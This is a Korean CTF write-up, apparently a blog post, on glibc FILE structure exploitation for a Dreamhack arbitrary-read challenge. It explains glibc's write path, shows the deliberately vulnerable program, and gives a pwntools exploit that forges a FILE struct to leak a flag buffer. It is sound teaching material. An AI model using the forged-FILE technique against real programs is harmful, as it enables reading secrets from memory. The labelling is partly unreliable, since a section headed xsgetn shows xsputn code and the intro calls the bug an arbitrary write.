파일을 읽고 쓰는 작업은 라이브러리 함수가 내부적으로 관리하는 파일 구조체의 포인터와 그 값을 활용해 이루어진다.

이번에는 이 파일 구조체를 조작해, 원하는 메모리 주소에 데이터를 쓰는 취약점에 대해 다뤄볼 것이다.

파일에서 데이터를 읽어오는 대표적인 함수로는 `fread`와 `fgets`가 있으며, 이 함수들은 내부적으로 `_IO_file_xsgetn` 함수를 호출해 실제 읽기 작업을 수행한다.

---

### **○ _IO_file_xsgetn**

```c
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  ...
  if (to_do + must_flush > 0)
    {
      _IO_size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
```

`if (to_do + must_flush > 0)`

아직 버퍼에 써야 할 데이터(`to_do`)가 남아있거나, 버퍼를 강제로 비워야 하는 상황(`must_flush`)이 있으면

`{ ... }` 안으로 들어가서 `block_size`, `do_write` 같은 변수를 준비하고

주석: **"이제 (가득 찬) 버퍼를 플러시한다."  —>** 즉, 버퍼에 쌓인 데이터를 실제 파일로 내보내겠다는 뜻.

`if (_IO_OVERFLOW (f, EOF) == EOF)`

`_IO_OVERFLOW`는 `f` 스트림의 버퍼를 비우는 함수 포인터(보통 `__overflow`)를 호출

→ 만약 이게 `EOF`를 리턴하면 (= flush 실패) → 에러 상황.

---

### **○ _IO_new_file_overflow**

```c
int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
  {
    f->_flags |= _IO_ERR_SEEN;
    __set_errno (EBADF);
    return EOF;
  }
  ...
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
             f->_IO_write_ptr - f->_IO_write_base);
}
int
_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  return (to_do == 0
      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)
```

실제로 파일에 버퍼 내용을 비우는 과정은 `_IO_new_file_overflow()`에서 시작된다. 

이 함수는 먼저 쓰기 금지 상태를 확인하고, `ch == EOF`일 경우 `_IO_do_write()`를 호출해 버퍼의 데이터를 파일에 기록한다. 

이후 `_IO_do_write()`는 `_IO_new_do_write()`로 연결되고, 최종적으로 `new_do_write()`를 거쳐 시스템콜 `write()`가 실행된다.

---

### **○ new_do_write**

```c
#define _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      _IO_off64_t new_pos
    = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
    return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
               && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
               ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
```

`new_do_write()`는 **실제 파일에 데이터를 쓰는 최종 단계**를 담당하는 함수

- `fp` → 파일 포인터
- `data` → 쓸 데이터
- `to_do` → 쓰고자 하는 바이트 수

1. **APPEND 모드 처리**

```c
if (fp->_flags & _IO_IS_APPENDING)
    fp->_offset = _IO_pos_BAD;
```

파일이 append 모드이면

Unix/POSIX에서는 `O_APPEND`가 알아서 처리하니까 별도 seek는 필요 없음.

대신 `_offset`을 `_IO_pos_BAD`로 설정해서 현재/후속 위치가 예측 불가임을 표시.

1. **읽기 버퍼와 쓰기 버퍼 충돌 처리**

```c
else if (fp->_IO_read_end != fp->_IO_write_base)
{
  _IO_off64_t new_pos = _IO_SYSSEEK(fp, fp->_IO_write_base - fp->_IO_read_end, 1);
  if (new_pos == _IO_pos_BAD)
    return 0;
  fp->_offset = new_pos;
}
```

- 읽기와 쓰기 버퍼가 겹쳐 있을 경우, **현재 파일 위치를 맞춰야 한다**.
- `_IO_SYSSEEK()` 호출 → 실제 파일 포인터 이동한다.
- 실패하면 0 반환한다.

1. **실제 쓰기**

```c
count = _IO_SYSWRITE(fp, data, to_do);
```

- `_IO_SYSWRITE` → 결국 `write()` 시스템콜로 데이터를 파일에 기록.

1. **컬럼 위치 조정 (터미널 출력용)**

```c
if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column(fp->_cur_column - 1, data, count) + 1;
```

- 출력 스트림이 터미널인 경우, **현재 커서 위치 컬럼 업데이트**

1. **버퍼 초기화**

```c
_IO_setg(fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
fp->_IO_write_end = (fp->_mode <= 0
             && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
             ? fp->_IO_buf_base : fp->_IO_buf_end);
```

- 읽기/쓰기 버퍼 포인터 초기화 → **버퍼를 비워서 다음 쓰기 준비**
- 라인 버퍼/언버퍼 모드이면 `write_end`를 `buf_base`로 설정

1. **반환값**

```c
return count;
```

- 실제로 기록된 바이트 수 변환

---

### iofile_aar.c

```c
// Name: iofile_aar
// gcc -o iofile_aar iofile_aar.c -no-pie

#include <stdio.h>
#include <unistd.h>
#include <string.h>

char flag_buf[1024];
FILE *fp;

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int read_flag() {
    FILE *fp;
    fp = fopen("/home/iofile_aar/flag", "r");
    fread(flag_buf, sizeof(char), sizeof(flag_buf), fp);
    fclose(fp);
}

int main() {
  const char *data = "TEST FILE!";

  init();
  read_flag();

  fp = fopen("/tmp/testfile", "w");

  printf("Data: ");

  read(0, fp, 300);

  fwrite(data, sizeof(char), sizeof(flag_buf), fp);
  fclose(fp);
}

```

이 프로그램은 표준 입출력을 버퍼링 없이 설정한 뒤(`init()`), `/home/iofile_aar/flag` 파일을 열어 내용을 `flag_buf`에 읽어온다(`read_flag()`). 그 후 `/tmp/testfile`이라는 새 파일을 쓰기 모드로 열고, 사용자 입력을 `read()`를 이용해 **파일 포인터 변수 `fp`에 직접** 읽으려고 시도한다. 이어서 `"TEST FILE!"`이라는 문자열을 `flag_buf` 크기만큼 파일에 쓴 뒤 파일을 닫는다.

---

### **핵심 포인트**

1. `read(0, fp, 300);` → **잘못된 사용**: `read()` 2번째 인자는 메모리 버퍼여야 하는데, 여기선 `FILE*`를 넣음 → 안전하지 않은 동작.
2. `fread()`와 `fwrite()`로 플래그와 데이터를 읽고 씀.
3. `/home/iofile_aar/flag` 파일에서 플래그를 읽어오기 때문에 **CTF에서 흔히 쓰이는 플래그 읽기 코드** 구조.

즉, 이 코드는 **버퍼 오버플로우나 FILE 포인터 조작 같은 취약점을 실험하기 위한 예제** 느낌이 강함.

---

### [**exploit**](https://keyme2003.tistory.com/entry/dreamhack-IOFILE-Arbitrary-Address-Read#exploit-1)

```python
from pwn import *
import warnings

warnings.filterwarnings('ignore')

p = remote('host1.dreamhack.games', 18046)
#p = process("./iofile_aar")
elf = ELF('./iofile_aar')
flag_buf = elf.symbols['flag_buf']
payload = p64(0xfbad0000 | 0x800)
payload += p64(0) # _IO_read_ptr
payload += p64(flag_buf) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(flag_buf) # _IO_write_base
payload += p64(flag_buf + 300) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(0) # _IO_buf_base
payload += p64(0) # _IO_buf_end
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(1) # stdout
p.sendlineafter(b"Data: ", payload)
p.interactive()
```
